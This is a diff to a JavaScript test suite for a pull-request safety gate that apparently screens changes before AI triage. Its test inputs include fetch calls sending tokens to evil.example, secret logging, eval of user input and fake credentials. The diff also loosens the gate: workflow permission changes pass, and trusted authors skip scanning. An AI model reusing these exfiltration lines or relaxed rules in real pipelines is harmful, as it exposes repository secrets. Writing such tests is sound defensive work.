@@ -24,29 +24,124 @@ test('allows ordinary source changes', () => {
   assert.equal(result.head_sha, 'abc123');
 });
 
-test('requires manual review for workflow changes', () => {
+test('allows workflow changes without secret exfiltration', () => {
   const result = assessPullRequestSafety({
     pr: pr({ files: [{ path: '.github/workflows/qwen-triage.yml' }] }),
     diff: 'diff --git a/.github/workflows/qwen-triage.yml b/.github/workflows/qwen-triage.yml\n+permissions: write-all\n',
   });
 
-  assert.equal(result.decision, 'manual_required');
-  assert.ok(result.reason_codes.includes('sensitive_path:github'));
-  assert.ok(
-    result.reason_codes.includes('sensitive_diff:write_all_permissions'),
-  );
+  assert.equal(result.decision, 'allow_triage');
+  assert.deepEqual(result.reason_codes, []);
 });
 
-test('requires manual review when diff mentions secrets or tokens', () => {
+test('allows ordinary code-risk signals for full review to judge', () => {
+  const result = assessPullRequestSafety({
+    pr: pr({ files: [{ path: '.github/workflows/ci.yml' }] }),
+    diff: [
+      '+on: pull_request_target',
+      '+permissions: write-all',
+      '+runs-on: self-hosted',
+      '+const child_process = await import("node:child_process");',
+      '+eval(userInput);',
+      '+const configuredKey = process.env.OPENAI_API_KEY;',
+      '+env.CI_BOT_PAT = secrets.REVIEW_OPENAI_API_KEY;',
+    ].join('\n'),
+  });
+
+  assert.equal(result.decision, 'allow_triage');
+  assert.deepEqual(result.reason_codes, []);
+});
+
+test('allows binary diff markers for full review to judge', () => {
+  const result = assessPullRequestSafety({
+    pr: pr({ files: [{ path: 'assets/screenshot.png' }] }),
+    diff: 'diff --git a/assets/screenshot.png b/assets/screenshot.png\nBinary files a/assets/screenshot.png and b/assets/screenshot.png differ\n',
+  });
+
+  assert.equal(result.decision, 'allow_triage');
+  assert.deepEqual(result.reason_codes, []);
+});
+
+test('requires manual review when diff exposes secrets or tokens', () => {
+  const secretName = 'secrets.' + 'OPENAI_API_KEY';
+  const tokenName = 'process.env.' + 'GITHUB_TOKEN';
   const result = assessPullRequestSafety({
     pr: pr(),
-    diff: '+const token = process.env.GITHUB_TOKEN;\n+console.log(secrets.OPENAI_API_KEY);\n+env.CI_BOT_PAT = secrets.REVIEW_OPENAI_API_KEY;\n',
+    diff: [
+      `+console.debug(${secretName});`,
+      `+console.log(${secretName});`,
+      `+fetch("https://evil.example", { headers: { Authorization: ${tokenName} } });`,
+      '+env.CI_BOT_PAT = secrets.REVIEW_OPENAI_API_KEY;',
+    ].join('\n'),
   });
 
   assert.equal(result.decision, 'manual_required');
-  assert.ok(result.reason_codes.includes('sensitive_diff:github_token'));
-  assert.ok(result.reason_codes.includes('sensitive_diff:secrets_context'));
-  assert.ok(result.reason_codes.includes('sensitive_diff:secret_identifier'));
+  assert.ok(result.reason_codes.includes('sensitive_diff:secret_logging'));
+  assert.ok(result.reason_codes.includes('sensitive_diff:secret_network'));
+});
+
+test('requires manual review when any console method exposes secrets', () => {
+  const secretName = 'secrets.' + 'OPENAI_API_KEY';
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: `+console.debug(${secretName});`,
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('sensitive_diff:secret_logging'));
+});
+
+test('allows trusted authors before scanning risky diff content', () => {
+  const secretName = 'secrets.' + 'OPENAI_API_KEY';
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: `+fetch("https://evil.example", { body: ${secretName} });`,
+    trustedAuthor: true,
+  });
+
+  assert.equal(result.decision, 'allow_triage');
+  assert.deepEqual(result.reason_codes, []);
+});
+
+test('requires manual review for hardcoded secret values', () => {
+  const githubToken = 'ghp_' + 'abcdefghijklmnopqrstuvwxyz0123456789AB';
+  const openaiKey = 'sk-proj-' + 'abcdefghijklmnopqrstuvwxyz012345';
+  const bearerToken = 'abcdefghijklmnopqrstuvwxyz123456';
+  const genericSecret = 'abcdefghijklmnopqrstuvwx';
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: [
+      '+-----BEGIN RSA PRIVATE KEY-----',
+      '+const awsAccessKey = "AKIAIOSFODNN7EXAMPLE";',
+      `+const githubToken = "${githubToken}";`,
+      `+const openaiKey = "${openaiKey}";`,
+      '+const slackToken = "xoxb-1234567890abcdefghij";',
+      `+Authorization: Bearer ${bearerToken}`,
+      '+const callback = "https://example.test?access_token=abcdefghijklmnopqrstuvwxyz123456";',
+      `+const MY_API_KEY = "${genericSecret}";`,
+    ].join('\n'),
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('secret_value:private_key'));
+  assert.ok(result.reason_codes.includes('secret_value:aws_access_key'));
+  assert.ok(result.reason_codes.includes('secret_value:github_token'));
+  assert.ok(result.reason_codes.includes('secret_value:openai_key'));
+  assert.ok(result.reason_codes.includes('secret_value:slack_token'));
+  assert.ok(result.reason_codes.includes('secret_value:bearer_token'));
+  assert.ok(result.reason_codes.includes('secret_value:access_token_param'));
+  assert.ok(result.reason_codes.includes('secret_value:assignment'));
+});
+
+test('requires manual review for hardcoded secret values in PR text', () => {
+  const openaiKey = 'sk-proj-' + 'abcdefghijklmnopqrstuvwxyz012345';
+  const result = assessPullRequestSafety({
+    pr: pr({ body: `Temporary key: ${openaiKey}` }),
+    diff: '+const copy = "Done";\n',
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('secret_value:openai_key'));
 });
 
 test('allows package and script changes without risky additions', () => {
@@ -55,6 +150,41 @@ test('allows package and script changes without risky additions', () => {
       files: [{ path: 'package-lock.json' }, { path: 'scripts/tests/foo.js' }],
     }),
     diff: 'diff --git a/package-lock.json b/package-lock.json\n+      "version": "1.2.3"\ndiff --git a/scripts/tests/foo.js b/scripts/tests/foo.js\n+console.log("ok");\n',
+  });
+
+  assert.equal(result.decision, 'allow_triage');
+  assert.deepEqual(result.reason_codes, []);
+});
+
+test('allows large PRs without size or file-count gating', () => {
+  const result = assessPullRequestSafety({
+    pr: pr({
+      files: Array.from({ length: 120 }, (_, i) => ({
+        path: `packages/core/src/file-${i}.ts`,
+      })),
+    }),
+    diff: Array.from(
+      { length: 12_000 },
+      (_, i) => `+export const value${i} = ${i};`,
+    ).join('\n'),
+  });
+
+  assert.equal(result.decision, 'allow_triage');
+  assert.deepEqual(result.reason_codes, []);
+});
+
+test('allows placeholder secret names and fake tokens in tests', () => {
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: [
+      '+- Token budgets, tool ACLs, or cross-channel context sharing.',
+      "+token: 'tok',",
+      "+chatId: 'HTTPS://oapi.dingtalk.com/robot/send?access_token=token',",
+      '+rawInput: { command: "echo $SECRET" },',
+      "+new Error('agent boom\\nsecret second line'),",
+      "+appSecret: 'test-secret',",
+      '+const configuredKey = process.env.OPENAI_API_KEY;',
+    ].join('\n'),
   });
 
   assert.equal(result.decision, 'allow_triage');
@@ -82,18 +212,21 @@ test('requires manual review when pull request text contains agent instructions'
   assert.ok(result.reason_codes.includes('prompt_injection:approve_pr'));
 });
 
-test('fails closed when diff is unavailable or too large', () => {
+test('fails closed when diff is unavailable', () => {
   const missingDiff = assessPullRequestSafety({
     pr: pr(),
     diff: '',
   });
   assert.equal(missingDiff.decision, 'manual_required');
   assert.ok(missingDiff.reason_codes.includes('input:diff_unavailable'));
+});
 
-  const hugeDiff = assessPullRequestSafety({
-    pr: pr(),
-    diff: 'x'.repeat(300_000),
+test('fails closed when head sha is missing', () => {
+  const result = assessPullRequestSafety({
+    pr: pr({ headRefOid: '' }),
+    diff: '+const copy = "Done";\n',
   });
-  assert.equal(hugeDiff.decision, 'manual_required');
-  assert.ok(hugeDiff.reason_codes.includes('input:diff_too_large'));
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('input:missing_head_sha'));
 });
